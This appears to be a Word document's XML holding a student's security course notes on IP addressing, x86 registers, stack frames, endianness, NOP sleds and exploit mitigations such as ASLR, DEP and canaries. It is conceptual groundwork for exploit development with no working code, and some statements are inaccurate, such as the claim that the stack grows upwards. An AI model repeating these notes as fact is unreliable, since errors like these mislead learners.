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200" w:line="312" w:lineRule="auto"/>
        <w:ind w:hanging="15"/>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Oliver Lee" w:id="0" w:date="2019-11-05T07:36:3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ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:del w:author="Anonymous" w:id="2" w:date="2019-10-22T12:28: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sui</w:delText>
          </w:r>
        </w:del>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523779" cy="2002681"/>
              <wp:effectExtent b="0" l="0" r="0" t="0"/>
              <wp:docPr descr="Placeholder image" id="10" name="image11.png"/>
              <a:graphic>
                <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:pic>
                    <pic:nvPicPr>
                      <pic:cNvPr descr="Placeholder image" id="0" name="image11.png"/>
                      <pic:cNvPicPr preferRelativeResize="0"/>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId6"/>
                      <a:srcRect b="0" l="0" r="0" t="0"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="3523779" cy="2002681"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000002">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="0" w:lineRule="auto"/>
        <w:ind w:hanging="15"/>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lfxrw3h3nzh" w:id="0"/>
        <w:bookmarkEnd w:id="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General Notes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000003">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="320" w:lineRule="auto"/>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khyvzwaknskh" w:id="1"/>
        <w:bookmarkEnd w:id="1"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000004">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vi67xmikl1i8" w:id="2"/>
        <w:bookmarkEnd w:id="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14/05/201</w:t>
        </w:r>
        <w:del w:author="Anonymous" w:id="4" w:date="2019-10-22T11:03:57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9</w:delText>
          </w:r>
        </w:del>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000005">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 addresses</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000006">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Ipv6 - 128 bit address</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000007">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Ipv4 - 32 bit address (less unique addresses) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000008">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>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0.0.0.0 default network, 255.255.255.255 broadcast address (both used for routing) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000009">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>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127 loopback addresses</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>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CLASSES</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="82"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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 addresses can be split into ABCDE classes of different ranges</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>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PRIVATE ADDRESSES</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="82"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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Internal use addresses. (service providers block)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="82"/>
        </w:numPr>
        <w:spacing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A(10.x.x.x)B(172.16.X.X) C(192.168.X.X)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000000F">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0">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3">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4">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5">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16">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="0" w:lineRule="auto"/>
        <w:ind w:hanging="15"/>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qhu9nwv3ehq" w:id="3"/>
        <w:bookmarkEnd w:id="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e-Learn Notes</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000017">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="320" w:lineRule="auto"/>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7idgoog39yy" w:id="4"/>
        <w:bookmarkEnd w:id="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System Security</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000018">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xmn5gr6v649" w:id="5"/>
        <w:bookmarkEnd w:id="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Architecture Fundamentals</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000019">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Machine code: Hex → translated to assemble (ie. netwide assembler and microsoft macro assembler)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001A">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Each CPU has its own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Instruction Set Architecture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ISA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Ie. memory, registers. Eg;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>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X86 instructions set</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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32 bit processors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>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X64 / x86_65 /amd64 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:spacing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64 versions </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000001F">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Note. Bit is the length of the registers </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000020">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8 General purpose registers (GPR). Different types, ie. EAX: accumulator for arithmetic</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002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EIP register, instruction pointer, controls the program execution by storing address of the next instruction</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002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23">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955q5iyed5" w:id="6"/>
        <w:bookmarkEnd w:id="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Process Memory</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000024">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Text → instruction segment, readonly</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000025">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 → initialised and uninitialised data. Ie variables [Block started by symbol(BSS) defaults uninitialised variables ]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000026">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Heap → if the data region needs to be extended</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000027">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Stack→ LIFO, high part of memory. Saves return add, function args, local variables.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ESP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stack pointer is to identify the top of the stack). Stack grows upwards</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000028">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="124"/>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PUSH: subtracts 4(32b) or 8(64b) from esp and writes to memory address in esp and updates to top of stack</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000029">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="124"/>
        </w:numPr>
        <w:spacing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POP: adds</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002A">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Instructions remain in stack until overwritten</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476250</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="1548263" cy="1414463"/>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48263" cy="1414463"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:anchor>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002B">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2C">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h861oifahk6" w:id="7"/>
        <w:bookmarkEnd w:id="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Stack Frames  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002D">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Stack frame is a logical area that is pushed ( for a func)  or popped (return val)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="125"/>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Created when subroutine (function or proc) is created. Assigned to the current ESP. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000002F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="125"/>
        </w:numPr>
        <w:spacing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When a new stack frame is created , ebp and esp are used, the old ebp is saved on  stack ( so the old stack info isn't lost)</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000030">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reorsqcc9et" w:id="8"/>
        <w:bookmarkEnd w:id="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Prologue</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003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Sequence that occurs prior to a function being pushed onto the stack and called</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000032">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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{PUSH ebp} → save old base pointer onto the stack ( so when function returns it can be called). EPB is no at prv stack frame</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000033">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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{MOV ebp, esp} → [dest, src] copy ESP to the EBP. ie.make a new stack frame by moving the pointer to the top of the stack into the pointer for the base (ebp)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000034">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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{SUB esp, X} → moves the top of the stack (stack pointer) subtract X places to make space for variables. Since stack grows upwards, subtracting grows it upwards</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000035">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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Variables are copied to stack (hex values offset by either pointer)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000036">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="240"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MOVE DWORD PRT SS:[ESP + Y ], 0B}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000037">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="240"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Move variable (0B) into address pointed to by base pointer offset by Y</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000038">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0w0ju7hp6a7" w:id="9"/>
        <w:bookmarkEnd w:id="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Epilogue</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000039">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What occurs after a return statement, to the previous procedure/stackframe (which can be restored due to the EBP saved to the stack in the prologue </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>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{move esp, ebp} → copy the current base pointer into the stack pointer. Ie, restore previous stack frame (they are the same at this point)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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{POP ebp} → return to the caller by retrieving the base pointer. This pops what is at the top of the stack (which is the ebp as saved in the first step of the prologue)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:spacing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Ret → pops top of stack into old eip. Jumps to that location</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003D">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zrkqn64ildj" w:id="10"/>
        <w:bookmarkEnd w:id="1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Notes (Stack Frames) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>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‘immunity debugger’ to inspect compiled code</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="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Move esp, ebp &amp; pop ebp is equal to leave </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000040">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4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4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43">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44">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ow3z9rc7hkku" w:id="11"/>
        <w:bookmarkEnd w:id="1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Endianness [representing stored data in memory]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000045">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Most Significant Bit (MSB) → in a binary no. is the largest value, usually the first on the left. Eg;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00</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000046">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Least Significant Bit (LSB) → first from right, Eg; 10</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0</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000047">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="127"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="200" w:line="240"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Big Endianness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LSB is at the highest memory address and MSB is at the lowest memory address</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000048">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="127"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="72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Little Endianness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MSB is stored at the highest memory address and the LSB is at the lowest</w:t>
        </w:r>
        <w:del w:author="Ravi Shekhar" w:id="5" w:date="2019-10-22T17:07:57Z">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142875</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3148013" cy="901062"/>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48013" cy="901062"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect"/>
                        <a:ln/>
                      </pic:spPr>
                    </pic:pic>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </w:r>
        </w:del>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142875</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="3148013" cy="901062"/>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48013" cy="901062"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:anchor>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000049">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4A">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vdcv7ovlqsh" w:id="12"/>
        <w:bookmarkEnd w:id="1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NOP[no operation instruction]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004B">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Assembly language instruction that is skipped. (0x90)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004C">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NOP-sled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fill a large/small portion of the stack with NOPs. This allows access to the instruction we wish to execute. Used in buffer overflows</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004D">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zagimmvk5fv" w:id="13"/>
        <w:bookmarkEnd w:id="1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Security Implementations</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004E">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Address Space Layout Randomisation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ASLR)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os loads same executable in different locations in memory every time. However all modules don’t have ASLR enabled. There could be a DLL without protection</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004F">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 execution prevention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DEP)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prevents execution of code from pages is memory that aren’t marked as executable.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000050">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Stack-Cookies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CANARY)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preloaded values is inserted in the prologue, when the epilogue is run, the same value is checked</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005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br w:type="page"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000052">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oxasdv6ep5c" w:id="14"/>
        <w:bookmarkEnd w:id="1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Assembler, Debuggers and Tools Arsenal</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000053">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:spacing w:before="200" w:line="312" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:del w:author="Anonymous" w:id="6" w:date="2019-10-22T12:15:04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Opcode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operation code (assembly mnemoni</w:t>
        </w:r>
        <w:del w:author="Anonymous" w:id="6" w:date="2019-10-22T12:15:04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c</w:delTex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w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005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Change w:author="Anonymous" w:id="0" w:date="2019-10-22T12:15:04Z">
          <w:pPr>
            <w:pStyle w:val="Heading3"/>
            <w:widowControl w:val="1"/>
            <w:spacing w:after="0" w:before="200" w:line="312" w:lineRule="auto"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_tudtkukjcvq1" w:id="15"/>
        <w:bookmarkEnd w:id="15"/>
        <w:del w:author="Anonymous" w:id="7" w:date="2019-10-22T12:18:33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A</w:delText>
          </w:r>
        </w:del>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ssembler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005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Program that translates assembly language to machine code.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005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Microsoft Macro Assembler (MASM)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x86 assembler that uses Intel syntax for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MS-DOS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and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Microsoft Windows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05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GNU Assembler (GAS)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used by the GNU Project. Default back-end of GCC.</w:t>
        </w:r>
      </w:ins>
    </w:p>
